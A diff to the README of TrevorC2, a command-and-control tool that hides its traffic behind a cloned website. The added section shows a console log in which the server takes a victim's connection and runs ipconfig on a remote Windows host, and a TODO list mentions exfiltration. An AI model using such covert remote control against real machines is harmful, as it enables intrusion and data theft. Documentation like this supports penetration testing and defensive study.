@@ -64,9 +64,66 @@ Next, edit the trevor2_client.py - change the configuration and system you want 
 
 python trevor2_client.py
 
+## Session Management
+
+TrevorC2 supports the ability to handle multiple shells coming from different hostnames. The way TrevorC2 works is it will identify new hostnames as sessions. You can interact with the sessions once you execute a command. If you have multiple sessions, you can type a command and interact with that session based on the session number stored globally. Example below:
+
+root@stronghold:/home/relik/Desktop/git/trevorc2# python trevorc2_server.py 
+
+TrevorC2 - Legitimate Website Covert Channel
+Written by: David Kennedy (@HackingDave)
+https://www.trustedsec.com
+[*] Cloning website: https://www.google.com
+[*] Site cloned successfully.
+[*] Starting Trevor C2 Server...
+[*] Next, enter the command you want the victim to execute.
+[*] Client uses random intervals, this may take a few.
+Enter the command to execute on victim: 
+*** Received connection from 172.16.37.133 and hostname DESKTOP-3VDNDSJ for TrevorC2.
+
+*** Received connection from 127.0.0.1 and hostname stronghold for TrevorC2.
+
+Enter the command to execute on victim: ipconfig
+*** Select which assets to interact with to execute the command ***
+
+1. DESKTOP-3VDNDSJ:172.16.37.133 (TrevorC2 Established)
+2. stronghold:127.0.0.1 (TrevorC2 Established)
+
+
+Enter the session number to interact with: 1
+[*] Waiting for command to be executed, be patient, results will be displayed here...
+[*] Received response back from client...
+=-=-=-=-=-=-=-=-=-=-=
+(HOSTNAME: DESKTOP-3VDNDSJ
+CLIENT: 172.16.37.133)
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : localdomain
+   Link-local IPv6 Address . . . . . : fe80::8984:c775:d798:3b88%4
+   IPv4 Address. . . . . . . . . . . : 172.16.37.133
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.37.2
+
+Ethernet adapter Bluetooth Network Connection:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Teredo Tunneling Pseudo-Interface:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : 2001:0:9d38:6ab8:8aa:24a3:53ef:da7a
+   Link-local IPv6 Address . . . . . : fe80::8aa:24a3:53ef:da7a%6
+   Default Gateway . . . . . . . . . : ::
+
+Enter the command to execute on victim:
+
 ## TODO
 
 #### Add ability for longer than 2048 data output. Query string parameter length limited size length.
-#### Add a C# and PowerShell module.
 #### Add do_POST support for POST exfil on longer data.
 #### Add upload/download functionality.
